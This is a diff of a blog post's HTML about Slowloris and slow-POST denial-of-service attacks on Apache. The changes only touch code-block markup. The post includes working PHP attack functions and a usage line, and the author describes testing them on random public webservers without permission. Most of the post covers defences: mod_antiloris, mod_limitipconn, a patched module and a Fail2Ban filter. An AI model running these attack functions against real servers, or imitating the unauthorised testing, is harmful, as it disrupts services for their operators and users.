@@ -108,9 +108,8 @@
 <h1>Attack</h1>
 <p>I run Apache, so, naturally, I was (and still am) concerned about this attack vector. The first step in preventing and solving security problems lies in understanding the attack. Luckily, in this case, the attack is devilishly simple. Based on a <span class="caps">PHP</span> version of the original Slowloris attack (<a href="http://seclists.org/fulldisclosure/2009/Jun/207">found here</a>), I wrote a modified script which also included the new <span class="caps">POST</span>-based attack method. The extended version of the script can be found on <a href="https://gist.github.com/771824">Github</a>.</p>
 <p>The usage is&nbsp;straightforward:</p>
-<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">scriptname</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">&lt;</span><span class="k">method</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">processes</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="err">`</span><span class="w"></span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="p">.</span><span class="o">/</span><span class="n">scriptname</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">&lt;</span><span class="k">method</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">processes</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="err">`</span><span class="w"></span>
+</code></pre></div>
 
 <p>Where:</p>
 <ul>
@@ -120,7 +119,7 @@
 <li><code>[host]</code> is an optional parameter which will be used in the &#8220;Host:&#8221;-request header. If left blank the same value as  will be&nbsp;used.</li>
 </ul>
 <p>The script really illustrates how simple the attacks are, lets comment a bit on the <code>attack_get</code> function:</p>
-<div class="highlight"><pre><span></span><span class="k">function</span><span class="w"> </span><span class="n">attack_get</span><span class="p">(</span><span class="err">$</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">host</span><span class="p">)</span><span class="err">{</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="n">attack_get</span><span class="p">(</span><span class="err">$</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">host</span><span class="p">)</span><span class="err">{</span><span class="w"></span>
 <span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">HTTP1</span><span class="mf">.1</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">Keep</span><span class="o">-</span><span class="n">Alive</span><span class="w"></span>
 <span class="w">    </span><span class="err">$</span><span class="n">request</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;GET / HTTP/1.1\r\n&quot;</span><span class="p">;</span><span class="w"></span>
 <span class="w">    </span><span class="err">$</span><span class="n">request</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;Host: $host\r\n&quot;</span><span class="p">;</span><span class="w"></span>
@@ -148,11 +147,10 @@
 <span class="w">        </span><span class="err">}</span><span class="w"></span>
 <span class="w">    </span><span class="err">}</span><span class="w"></span>
 <span class="err">}</span><span class="w"></span>
-</pre></div>
-
+</code></pre></div>
 
 <p>The <code>attack_post</code> function works very&nbsp;similar:</p>
-<div class="highlight"><pre><span></span><span class="k">function</span><span class="w"> </span><span class="n">attack_post</span><span class="p">(</span><span class="err">$</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">host</span><span class="p">)</span><span class="err">{</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="n">attack_post</span><span class="p">(</span><span class="err">$</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">host</span><span class="p">)</span><span class="err">{</span><span class="w"></span>
 <span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="n">location</span><span class="p">,</span><span class="w"> </span><span class="n">eventually</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">existing</span><span class="w"> </span><span class="n">URL</span><span class="w"></span>
 <span class="w">    </span><span class="err">$</span><span class="n">request</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;POST /&quot;</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nf">rand</span><span class="p">()).</span><span class="ss">&quot; HTTP/1.1\r\n&quot;</span><span class="p">;</span><span class="w"></span>
 <span class="w">    </span><span class="err">$</span><span class="n">request</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;Host: $host\r\n&quot;</span><span class="p">;</span><span class="w"></span>
@@ -176,8 +174,7 @@
 <span class="w">        </span><span class="err">}</span><span class="w"></span>
 <span class="w">    </span><span class="err">}</span><span class="w"></span>
 <span class="err">}</span><span class="w"></span>
-</pre></div>
-
+</code></pre></div>
 
 <p>You can also download an <span class="caps">OWASP</span> (Open Web Application Security Project) tool found <a href="http://www.owasp.org/index.php/OWASP_HTTP_Post_Tool">here</a> which does the same. The tool contains a <span class="caps">GUI</span> which lets you choice the attack method (slow headers or slow post), has proxy support, and allows setting attack parameters. The slow header attack can use <span class="caps">GET</span> or <span class="caps">POST</span> requests, whereas my script above can not and only uses <span class="caps">GET</span>. Not that it matters much for that method, as the headers are the crucial&nbsp;factor.</p>
 <p>The attack certainly works. In my testing, I was able to <span class="caps">DOS</span> about 30% of all sampled webservers (retrieved from just random Google results), including my own. A funny side effect of this method is that, once you stop attacking, the server immediately becomes responsive again as the connection pool is freed. The slow post attack worked more reliable in my testing than the slow&nbsp;headers.</p>
@@ -213,12 +210,11 @@
 <p>Turning <code>KeepAlive</code> completely off might help, but it is no real remedy. The <span class="caps">POST</span> attack still remains an issue. Tweaking with the Apache options alone is thus certainly not&nbsp;enough.</p>
 <h2>mod_antiloris</h2>
 <p>Some developers have released Apache modules geared to mitigate the Slowloris attack. The two most common ones are <code>mod_antiloris</code> and <code>mod_noloris</code>. Both use the same trick to prevent attacks. They both hook into connection&nbsp;attempts:</p>
-<div class="highlight"><pre><span></span><span class="err">ap_hook_process_connection(pre_connection, NULL, NULL, APR_HOOK_FIRST);</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="err">ap_hook_process_connection(pre_connection, NULL, NULL, APR_HOOK_FIRST);</span>
+</code></pre></div>
 
 <p>And count how many connections from the same remote <span class="caps">IP</span> are already in the SERVER_BUSY_READ state (the server is reading data from a client). When this count is too high, subsequent connections get&nbsp;denied:</p>
-<div class="highlight"><pre><span></span><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">server_limit</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="err">{</span>
+<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">server_limit</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="err">{</span>
     <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">thread_limit</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="err">{</span>
         <span class="n">ws_record</span> <span class="o">=</span> <span class="n">ap_get_scoreboard_worker</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
         <span class="n">switch</span> <span class="p">(</span><span class="n">ws_record</span><span class="o">-&gt;</span><span class="n">status</span><span class="p">)</span> <span class="err">{</span>
@@ -238,23 +234,21 @@
 <span class="err">}</span> <span class="k">else</span> <span class="err">{</span>
     <span class="k">return</span> <span class="n">DECLINED</span><span class="p">;</span>
 <span class="err">}</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Installing <a href="http://sourceforge.net/projects/mod-antiloris/">mod_antiloris</a> in Ubuntu is a simple matter of&nbsp;executing:</p>
 <p><code>$ sudo apt-get install libapache2-mod-antiloris</code></p>
 <h2>mod_limitipconn</h2>
 <p>During testing, I discovered that the mod_antiloris module above only protects against the original slow header variant of the Slowloris attack. The slow post was still killing my webserver. So I explored the use of another mod, named <a href="http://dominia.org/djao/limitipconn2.html">mod_limitipconn</a>, which limits simultaneous requests from the same <span class="caps">IP</span>.</p>
 <p>There is no Apache2 module of <code>mod_limitipconn</code> in the Ubuntu repositories, but a Debian deb package is available online and works fine on&nbsp;Ubuntu:</p>
-<div class="highlight"><pre><span></span><span class="err"># Use the i386 package if you have to...</span>
+<div class="highlight"><pre><span></span><code><span class="err"># Use the i386 package if you have to...</span>
 <span class="err">$ wget http://elonen.iki.fi/code/unofficial-debs/mod-limitipconn/apache2-mod-limitipconn_0.22-2_amd64.deb</span>
 <span class="err">$ sudo dpkg -i ./apache2-mod-limitipconn_0.22-2_amd64.deb</span>
 <span class="err">$ sudo a2enmod limitipconn</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Before you restart Apache, create a configuration file at <code>/etc/apache2/conf.d/limitipconn.conf</code>:</p>
-<div class="highlight"><pre><span></span>ExtendedStatus On
+<div class="highlight"><pre><span></span><code>ExtendedStatus On
 <span class="nt">&lt;IfModule</span> <span class="err">mod_limitipconn.c</span><span class="nt">&gt;</span>
         <span class="nt">&lt;Location</span> <span class="nt">/&gt;</span>
                 # Global settings here
@@ -263,16 +257,14 @@
                 NoIPLimit image/*
         <span class="nt">&lt;/Location&gt;</span>
 <span class="nt">&lt;/IfModule&gt;</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Now the server can be&nbsp;restarted:</p>
-<div class="highlight"><pre><span></span>$ sudo /etc/init.d/apache2 restart
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>$ sudo /etc/init.d/apache2 restart
+</code></pre></div>
 
 <p>When investigating the source code of mod_limitipconn, we find the following&nbsp;lines:</p>
-<div class="highlight"><pre><span></span><span class="err">/* Count up the number of connections we are handling right now from</span>
+<div class="highlight"><pre><span></span><code><span class="err">/* Count up the number of connections we are handling right now from</span>
 <span class="err">* this IP address */</span>
 <span class="err">for (i = 0; i &lt; server_limit; ++i) {</span>
 <span class="err">    for (j = 0; j &lt; thread_limit; ++j) {</span>
@@ -292,8 +284,7 @@
 <span class="err">                break;</span>
 <span class="err">    }</span>
 <span class="err">}</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Not much different compared to the previous mods, except that <code>mod_limitipconn</code> takes into account all possible server states. Not surprisingly, the attack stopped working after installing this mod. You can disable <code>mod_antiloris</code> when using this module. One might wonder which state actually protects against the slow post attack variant. One would except <code>SERVER_BUSY_READ</code> to intercept these as well, as the server is, in fact, still reading a request from the client and waiting for it to complete. However, as it turns out, the server actually switches to the <code>SERVER_BUSY_WRITE</code> state when receiving a <span class="caps">POST</span>, as described on the <a href="http://www.pubbs.net/200910/httpd/29387-crazy-slowloris-mitigation-patch.html">mailing lists</a>:</p>
 <blockquote>
@@ -302,7 +293,7 @@
 <p>Interesting information, and some valid&nbsp;points.</p>
 <h2>Modified&nbsp;mod_antiloris</h2>
 <p>With this in mind I set out to modify mod_antiloris, as I wasn&#8217;t completely happy with mod_limitipconn. The module works great, but provided too much configuration overhead. I wanted something really simple. The source code for mod_antiloris was quickly edited to include a second counter, and to check the request string (i.e. it has to contain &#8220;<span class="caps">POST</span>&#8221;).</p>
-<div class="highlight"><pre><span></span><span class="err">switch (ws_record-&gt;status) {</span>
+<div class="highlight"><pre><span></span><code><span class="err">switch (ws_record-&gt;status) {</span>
 <span class="err">    case SERVER_BUSY_READ:</span>
 <span class="err">        if (strcmp(client_ip, ws_record-&gt;client) == 0){</span>
 <span class="err">     ip_read_count++;</span>
@@ -316,23 +307,20 @@
 <span class="err">    default:</span>
 <span class="err">        break;</span>
 <span class="err">}</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>I also modified the logging to look a bit more like normal Apache error lines. This will come into play in the next step. The full modified source code is available on <a href="https://gist.github.com/773464">Github</a>.</p>
 <p>Installing and compiling the module requires little&nbsp;work:</p>
-<div class="highlight"><pre><span></span>$ sudo apt-get install gcc apache2-threaded-dev
+<div class="highlight"><pre><span></span><code>$ sudo apt-get install gcc apache2-threaded-dev
 $ wget https://gist.github.com/raw/773464/4e7250692c34f55725384525b513e71be7541f5a/mod_muantiloris.c
 $ sudo apxs2 -a -i -c mod_muantiloris.c
 $ sudo /etc/init.d/apache2 restart
-</pre></div>
-
+</code></pre></div>
 
 <p>Don&#8217;t forget to disable mod_antiloris and/or mod_limitipconn if you have them enabled (using <code>a2dismod</code>). The modified module uses only two optional configuration&nbsp;directives:</p>
-<div class="highlight"><pre><span></span><span class="err">IPReadLimit (default 5)</span>
+<div class="highlight"><pre><span></span><code><span class="err">IPReadLimit (default 5)</span>
 <span class="err">IPPostLimit (default 10)</span>
-</pre></div>
-
+</code></pre></div>
 
 <p><strong>Note</strong>: just as with <code>mod_limitipconn</code>, the <code>ExtendedStatus</code> directive should be set to <code>On</code> for this module to&nbsp;work!</p>
 <p>The module blocks both attack variants, and logs to <code>error.log</code> like&nbsp;so:</p>
@@ -341,7 +329,7 @@ $ sudo /etc/init.d/apache2 restart
 <h2>Fail2Ban</h2>
 <p>The following step is optional and only recommended if you already have Fail2Ban installed and running. <a href="http://www.fail2ban.org/">Fail2Ban</a> is a handy tool to ban <span class="caps">IP</span>&#8217;s based on regex tests on logfiles. (I&#8217;ve caught dozens of Chinese, Brazilian and Russian trespassers&nbsp;already.)</p>
 <p>I use the following filter in combination with the modified mod_antiloris&nbsp;above:</p>
-<div class="highlight"><pre><span></span><span class="k">[Definition]</span>
+<div class="highlight"><pre><span></span><code><span class="k">[Definition]</span>
 <span class="c1"># Option:  failregex</span>
 <span class="c1"># Notes.:  regex to match the password failure messages in the logfile. The</span>
 <span class="c1">#          host must be matched by a group named &quot;host&quot;. The tag &quot;&quot; can</span>
@@ -357,8 +345,7 @@ $ sudo /etc/init.d/apache2 restart
 <span class="c1"># Values:  TEXT</span>
 <span class="c1">#</span>
 <span class="na">ignoreregex</span> <span class="o">=</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>I do set the <code>bantime</code> to a low value and <code>maxretry</code> parameter to a high amount however, as the module tends to generate a lot of error lines and legitimate, aggressive browsers sometimes like to make a lot of concurrent requests as well (mod_limitipconn did have the added benefit of specifying mime type to ignore, although its recognition is based on a reduced <span class="caps">URI</span> request string from the Apache scoreboard). Fail2Ban uses IPTables, which has the added benefit that once an <span class="caps">IP</span> is banned, Apache can stop dealing with its flooding&nbsp;altogether.</p>
 <p>That concludes this blog post. I hope you&#8217;ve found the material helpful. Feel free to use any code here and on Github as you see&nbsp;fit.</p>
